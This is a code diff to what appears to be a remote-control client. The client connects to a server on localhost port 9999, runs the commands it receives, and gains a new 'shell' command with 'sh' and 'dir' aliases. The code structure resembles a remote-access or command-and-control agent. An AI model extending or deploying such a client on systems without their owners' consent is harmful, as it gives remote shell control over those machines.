@@ -11,6 +11,7 @@ from client.commands.mkdir import make_directory
 from client.commands.pwd import print_working_directory
 from client.commands.rm import remove
 from client.commands.rmdir import remove_directory
+from client.commands.sh import shell
 from client.commands.touch import touch
 
 # Command registry
@@ -24,7 +25,13 @@ COMMANDS = {
     "mkdir": make_directory,
     "touch": touch,
     "echo": echo,
+    "shell": shell,
     "help": get_help,
+}
+
+ALIASES = {
+    "sh": "shell",
+    "dir": "ls",
 }
 
 def execute_command(command_line):
@@ -33,6 +40,10 @@ def execute_command(command_line):
         return "[*] No command provided."
 
     command = args[0]
+
+    if command in ALIASES:
+        command = ALIASES[command]
+
     if command not in COMMANDS:
         return f"[*] Unknown command: `{command}`"
 
@@ -62,7 +73,7 @@ def keep_alive_client(host='127.0.0.1', port=9999):
 
                 if data.get("type") == "command":
                     command_to_execute = data["payload"]["command"]
-                    print(f"📥 Command received: `{command_to_execute}`")
+                    print(f"[*] Command received: `{command_to_execute}`")
 
                     output = execute_command(command_to_execute)
                     current_dir = client_data.current_directory
